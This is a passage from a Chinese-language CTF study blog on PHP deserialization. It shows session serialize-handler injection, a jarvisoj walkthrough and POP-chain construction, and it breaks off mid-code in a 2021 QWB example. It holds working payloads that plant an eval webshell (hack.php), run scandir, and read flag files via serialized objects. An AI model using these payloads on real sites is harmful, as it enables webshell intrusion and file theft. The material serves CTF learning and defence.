check.php</p><blockquote><p>file_put_contents(“log-“.$this-&gt;username, “使用”.$this-&gt;password.”登陆”.($this-&gt;status?”成功”:”失败”).”—-“.date_create()-&gt;format(‘Y-m-d H:i:s’));</p></blockquote><p>也就是说我们需要通过 cookie 传进去我们的恶意代码，看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021221915549.png"></p><p><code>MQ%3D%3D</code>–&gt;<code>MQ==</code>–&gt;<code>a</code>，很明显的传值了，首先在 cookie 中设置 limit 值为 payload，然后刷新 index.php，此时 session_start()开启了会话，盲猜是 php_serialize 引擎存储的对象数据，我们再通过访问包含了 inc.php 的 check.php，就执行了设置 php 为引擎的代码，进而反序列化得到一个新的对象</p><p>所以通过注入 <code>|</code> 字符伪造了对象的序列化数据，生成木马文件</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;hack.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-string">&#x27;|&#x27;</span>.serialize(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>cookie 中含有 UM_distinctid 的，不可用 hackbar 的增加头功能，会覆盖掉原有的 cookie，而我们的目标只是替换 cookie[PHPSESSID]值</p><h4 id="jarvisoj-web-的一道-SESSION-反序列化"><a href="#jarvisoj-web-的一道-SESSION-反序列化" class="headerlink" title="jarvisoj-web 的一道 SESSION 反序列化"></a>jarvisoj-web 的一道 SESSION 反序列化</h4><p><a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>存在<code>ini_set(‘session.serialize_handler’, ‘php’)</code>，暂时没找到用 php_serialize 添加 session 的方法，但 get 传入 phpinfo 时会实例化<code>OowoO</code>这个类并可以查看 phpinfo</p><blockquote><p>index.php?phpinfo</p></blockquote><p>disable_function</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/12/.png"></p><p><code>session.upload_progress.enabled</code>为 On。<code>session.upload_progress.enabled</code>本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时 POST 一个与 php.ini 中<code>session.upload_progress.name</code>同名的变量时（<code>session.upload_progress.name</code>的变量值默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code>），PHP 检测到这种同名请求会在$_SESSION 中添加一条数据。我们由此来设置 session。</p><p>首先 先构造一个文件上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span></span><br><span class="hljs-tag">  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着搞反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>防止转义，在引号前面加上\得到<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715000429267.png"></p><p>在 phpinfo 得知根目录为<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p><p>修改传引用为<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p><p>同样的方法得到 payload：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715001047516.png"></p><h2 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>传统的 PHP 要求应用程序导入每个类中的所有类文件，这样就意味着每个 PHP 文件需要一列长长的 include 或 require 方法，而在当前主流的 PHP 框架中，都采用了 Autoloading 自动加载类来完成这样繁重的工作。在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。Composer 是 PHP 用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer 默认是从 Packagist 来下载依赖库的。<br>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p><p>1.从可能存在漏洞的依赖库文件入手 可以使用代码审计工具或者全局手动搜索__wakeup()和__destruct()</p><p>在 composer.json 中存在以下组件就要引起注意了</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">任意写<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>任意删除<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure><p>2.从应用的代码框架的逻辑上入手</p><p>3.从 PHP 语言本身漏洞入手</p><h3 id="POP-链利用"><a href="#POP-链利用" class="headerlink" title="POP 链利用"></a>POP 链利用</h3><p>有两种情形：</p><ul><li>在 PHP 魔术方法中出现缺陷代码，自动调用而触发漏洞</li><li>缺陷代码不在魔术方法中，而是在一个类的普通方法中。这时候就要寻找相同的函数名，将类的属性和敏感函数(能背利用的同名函数)的属性联系起来。</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到需要执行 GetFlag 类中的 get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个 POP 链。</p><ol><li><p><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</p></li><li><p>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</p></li><li><p>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</p></li><li><p>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</p></li><li><p>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</p></li></ol><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//把$mod1赋值为Call类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//把 $mod1赋值为funct类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//把 $mod1赋值为func类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//把 $mod1赋值为string1类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//把 $str1赋值为GetFlag类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//构造start_gg类对象$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//显示输出url编码后的序列化对象</span><br></code></pre></td></tr></table></figure><h4 id="2021-强网杯赌徒"><a href="#2021-强网杯赌徒" class="headerlink" title="2021 强网杯赌徒"></a>2021 强网杯赌徒</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 